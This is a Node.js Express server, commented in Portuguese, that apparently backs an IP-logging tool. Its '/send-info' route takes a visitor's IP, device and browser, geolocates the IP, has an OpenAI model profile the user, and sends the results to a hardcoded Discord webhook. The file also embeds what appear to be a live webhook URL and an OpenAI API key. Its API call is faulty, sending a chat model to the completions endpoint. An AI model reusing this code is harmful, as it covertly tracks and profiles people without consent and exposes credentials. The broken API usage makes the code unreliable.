const express = require('express');
const axios = require('axios');
const geolocation = require('geolocation-db');
const app = express();
const port = process.env.PORT || 3000;

const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3';
const aiApiKey = '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';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Função para obter as informações do usuário
async function getUserInfo(ip) {
  const locationData = geolocation.lookup(ip);
  
  return locationData;
}

// Função para gerar um resumo usando a IA
async function getAISummary(ip, deviceInfo, region, browser) {
  const prompt = `Resuma as informações abaixo:
  IP: ${ip}
  Dispositivo: ${deviceInfo}
  Região: ${region}
  Navegador: ${browser}
  
  Gera um resumo sobre o tipo de usuário e o que ele pode usar seu dispositivo para.`;

  try {
    const response = await axios.post(
      'https://api.openai.com/v1/completions',
      {
        model: "gpt-3.5-turbo",
        prompt: prompt,
        max_tokens: 100
      },
      {
        headers: {
          Authorization: `Bearer ${aiApiKey}`
        }
      }
    );
    return response.data.choices[0].text.trim();
  } catch (error) {
    console.error('Erro ao conectar com a API de IA:', error);
    return 'Erro ao gerar o resumo.';
  }
}

// Rota para capturar e enviar as informações
app.post('/send-info', async (req, res) => {
  try {
    const { ip, deviceInfo, browser } = req.body;
    
    // Obter dados de localização com o IP
    const locationData = await getUserInfo(ip);
    
    // Resumo gerado com IA
    const summary = await getAISummary(ip, deviceInfo, locationData.city, browser);

    // Enviar ao webhook
    const webhookPayload = {
      content: `**Informações do Usuário:**\n
      IP: ${ip}\n
      Dispositivo: ${deviceInfo}\n
      Navegador: ${browser}\n
      Região: ${locationData.city}, ${locationData.country_name}\n
      Resumo da IA: ${summary}`
    };

    await axios.post(webhookUrl, webhookPayload);

    res.status(200).send('Informações enviadas com sucesso!');
  } catch (error) {
    console.error('Erro ao enviar informações:', error);
    res.status(500).send('Erro ao processar as informações.');
  }
});

// Iniciar o servidor
app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
